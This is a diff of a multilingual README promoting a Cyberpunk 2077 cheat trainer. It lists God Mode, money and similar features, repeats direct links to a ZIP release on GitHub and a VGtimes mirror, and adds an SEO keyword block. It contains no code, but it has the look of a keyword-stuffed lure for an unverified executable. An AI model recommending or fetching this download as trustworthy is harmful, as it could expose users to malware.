@@ -1,10 +1,11 @@
-# Cyberpunk 2077 Trainer
+# Cyberpunk 2077 Trainer (NetrunnerForge +46)
 ### God Mode · Money · One Hit · No Reload · Infinite RAM · XP
 
 **Languages / Языки:** [Русский](README.md) · [English](README.en.md) · [Українська](README.uk.md) · [简体中文](README.zh.md) · [Türkçe](README.tr.md) · [Español](README.es.md) · [Slovenščina](README.sl.md) · [Português](README.pt.md) · [Polski](README.pl.md) · [Indonesia](README.id.md) · [Deutsch](README.de.md) · [Français](README.fr.md)
 
-**NetrunnerForge**-Trainer für **Cyberpunk 2077** (inkl. Phantom Liberty) — **+46** Funktionen.
-EN / RU · Prozess `Cyberpunk2077.exe`
+**Cyberpunk 2077 Trainer Download** — NetrunnerForge +46.
+God Mode, Money, One Hit, No Reload, Infinite RAM, XP, Street Cred, Phantom Liberty.
+EN / RU · `Cyberpunk2077.exe` · Windows 10/11
 
 
 <p align="center">
@@ -23,6 +24,7 @@ EN / RU · Prozess `Cyberpunk2077.exe`
 
 <p align="center">
   <img src="https://img.shields.io/badge/game-Cyberpunk%202077-ff2a6d"/>
+  <img src="https://img.shields.io/badge/brand-NetrunnerForge-0ea5e9"/>
   <img src="https://img.shields.io/badge/cheats-%2B46-22c55e"/>
   <img src="https://img.shields.io/badge/UI-EN%20%7C%20RU-0ea5e9"/>
   <img src="https://img.shields.io/badge/process-Cyberpunk2077.exe-111827"/>
@@ -31,41 +33,40 @@ EN / RU · Prozess `Cyberpunk2077.exe`
 
 ---
 
-## Download
+## Cyberpunk 2077 Trainer Download
 
-> Direkter ZIP-Link aus dem Release:
+> Direct ZIP / Прямая ссылка:
 
-**→ [Cyberpunk2077_NetrunnerForgeTrainer.zip herunterladen](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/download/v1.0.0/Cyberpunk2077_NetrunnerForgeTrainer.zip)**
+**→ [Cyberpunk2077_NetrunnerForgeTrainer.zip](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/download/v1.0.0/Cyberpunk2077_NetrunnerForgeTrainer.zip)**
 
-Release-Seite: **→ [v1.0.0](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/tag/v1.0.0)**
+Release / Релиз: **→ [v1.0.0](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/tag/v1.0.0)**
 
-Auch auf **VGtimes**:  
-**→ [Cyberpunk 2077 Trainer +46](https://vgtimes.ru/games/cyberpunk-2077/files/96506-cyberpunk-2077-trejjner-46.html)**
+Also on **VGtimes**: **→ [Cyberpunk 2077 trainer +46](https://vgtimes.ru/games/cyberpunk-2077/files/96506-cyberpunk-2077-trejjner-46.html)**
 
-Spiel starten → Trainer starten → auf `Cyberpunk2077.exe` warten → Funktionen aktivieren.
-
----
-
-## Screenshots
-
-<p align="center">
-  <img src="screenshots/01-mercenary.png" alt="Mercenary" width="48%"/>
-  &nbsp;
-  <img src="screenshots/02-combat.png" alt="Combat" width="48%"/>
-</p>
-<p align="center">
-  <img src="screenshots/03-cybernetics.png" alt="Cybernetics" width="48%"/>
-  &nbsp;
-  <img src="screenshots/04-economy.png" alt="Economy" width="48%"/>
-</p>
-<p align="center">
-  <img src="screenshots/05-world.png" alt="World" width="86%"/>
-</p>
-
+Game → trainer → `Cyberpunk2077.exe` → enable cheats.
 
 ---
 
-## Funktionen (+46)
+## Screenshots / Скриншоты
+
+<p align="center">
+  <img src="screenshots/01-mercenary.png" alt="Mercenary God Mode" width="48%"/>
+  &nbsp;
+  <img src="screenshots/02-combat.png" alt="Combat One Hit No Reload" width="48%"/>
+</p>
+<p align="center">
+  <img src="screenshots/03-cybernetics.png" alt="Cybernetics Infinite RAM" width="48%"/>
+  &nbsp;
+  <img src="screenshots/04-economy.png" alt="Economy Eddies XP Street Cred" width="48%"/>
+</p>
+<p align="center">
+  <img src="screenshots/05-world.png" alt="World Freeze Time Flight" width="86%"/>
+</p>
+
+
+---
+
+## Features / Возможности (+46)
 
 ### Mercenary / Наёмник
 - God Mode (`Num 1`)
@@ -126,72 +127,57 @@ Spiel starten → Trainer starten → auf `Cyberpunk2077.exe` warten → Funktio
 
 ---
 
-## Nutzung
+## How to use / Как пользоваться
 
-1. ZIP über den grünen Button laden
-2. Archiv entpacken
-3. **Cyberpunk 2077** starten
-4. Trainer starten
-5. Auf `Cyberpunk2077.exe` warten
-6. Kategorien: Mercenary / Combat / Cybernetics / Economy / World
-7. `Num` = umschalten · `Ctrl+Shift+Home` = alles aus
-8. UI-Sprache: **EN** / **RU**
-
-| Taste | Aktion |
-|---------|----------|
-| `Num …` | Ein / Aus |
-| `Ctrl + Shift + Home` | Master Off |
-
----
-
-## Links
-
-- **ZIP:** [Cyberpunk2077_NetrunnerForgeTrainer.zip](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/download/v1.0.0/Cyberpunk2077_NetrunnerForgeTrainer.zip)
-- **Release:** [v1.0.0](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/tag/v1.0.0)
-- **VGtimes:** [https://vgtimes.ru/games/cyberpunk-2077/files/96506-cyberpunk-2077-trejjner-46.html](https://vgtimes.ru/games/cyberpunk-2077/files/96506-cyberpunk-2077-trejjner-46.html)
-- **Repo:** [https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM)
-- **Org:** [https://github.com/TrainerHubMoggyDay](https://github.com/TrainerHubMoggyDay)
-
----
-
-## Unterstützte Version
+1. Download ZIP via the green button
+2. Extract
+3. Launch **Cyberpunk 2077**
+4. Launch the trainer
+5. Wait for `Cyberpunk2077.exe`
+6. Categories: Mercenary / Combat / Cybernetics / Economy / World
+7. `Num` = toggle · `Ctrl+Shift+Home` = master off
+8. UI: **EN / RU**
 
 | | |
 |--|--|
-| Spiel | Cyberpunk 2077 (+ Phantom Liberty) |
-| Cheats | +46 |
-| Prozess | `Cyberpunk2077.exe` |
-| OS | Windows 10 / 11 |
-| Version | v1.0.0 |
+| Game / Игра | Cyberpunk 2077 (+ Phantom Liberty) |
+| Process / Процесс | `Cyberpunk2077.exe` |
+| Cheats / Читов | +46 |
+| Version / Версия | v1.0.0 |
+| UI | EN / RU |
 
 ---
 
 ## FAQ
 
 **Wo herunterladen?**  
-Grüner Button oder [direkter ZIP](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/download/v1.0.0/Cyberpunk2077_NetrunnerForgeTrainer.zip). Auch [VGtimes](https://vgtimes.ru/games/cyberpunk-2077/files/96506-cyberpunk-2077-trejjner-46.html).
+[ZIP v1.0.0](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/download/v1.0.0/Cyberpunk2077_NetrunnerForgeTrainer.zip) · [VGtimes](https://vgtimes.ru/games/cyberpunk-2077/files/96506-cyberpunk-2077-trejjner-46.html)
 
 **God Mode / Geld / One Hit / Infinite RAM?**  
-Ja — siehe Funktionsliste.
+Yes — see features list.
 
-**Russische UI?**  
-Ja — Schalter **RU** unten.
+**Russische Sprache?**  
+Ja, **RU**-Schalter unten.
 
 ---
 
 ## Haftungsausschluss
 
-Nur Singleplayer. Autor und [TrainerHub MoggyDay](https://github.com/TrainerHubMoggyDay) übernehmen keine Haftung. Nicht online nutzen.
+Nur Einzelspieler. [TrainerHub MoggyDay](https://github.com/TrainerHubMoggyDay) übernimmt keine Haftung.
 
 ---
+
 
 <p align="center">
   <a href="https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/download/v1.0.0/Cyberpunk2077_NetrunnerForgeTrainer.zip">
     <img src="https://img.shields.io/badge/%F0%9F%93%A5%20DOWNLOAD%20ZIP-22c55e?style=for-the-badge&labelColor=14532d" alt="Download"/>
   </a>
 </p>
+<p align="center"><sub>NetrunnerForge · Cyberpunk 2077 · <a href="https://github.com/TrainerHubMoggyDay">TrainerHub MoggyDay</a></sub></p>
 
-<p align="center">
-  <sub>NetrunnerForge · Cyberpunk 2077 · <a href="https://github.com/TrainerHubMoggyDay">TrainerHub MoggyDay</a></sub>
-</p>
 
+---
+
+## SEO / Keywords
+
+`Cyberpunk 2077 Trainer download` · `Cyberpunk 2077 Cheats` · `Cyberpunk 2077 God Mode` · `download Cyberpunk 2077 trainer` · `Cyberpunk 2077 trainer download` · `CP2077 trainer` · `Cyberpunk 2077 cheats` · `Cyberpunk 2077 hack` · `Cyberpunk 2077 mods` · `Cyberpunk 2077 god mode` · `Cyberpunk 2077 money hack` · `Cyberpunk 2077 eddies` · `Cyberpunk 2077 infinite money` · `Cyberpunk 2077 one hit kill` · `Cyberpunk 2077 no reload` · `Cyberpunk 2077 infinite ammo` · `Cyberpunk 2077 infinite RAM` · `Cyberpunk 2077 instant hacking` · `Cyberpunk 2077 quickhack` · `Cyberpunk 2077 breach protocol` · `Cyberpunk 2077 street cred` · `Cyberpunk 2077 XP hack` · `Cyberpunk 2077 attribute points` · `Cyberpunk 2077 perk points` · `Cyberpunk 2077 relic points` · `Cyberpunk 2077 Phantom Liberty trainer` · `Cyberpunk 2077 DLC cheats` · `NetrunnerForge` · `Cyberpunk2077.exe trainer` · `free Cyberpunk 2077 trainer` · `Cyberpunk 2077 trainer 2026` · `TrainerHub MoggyDay`
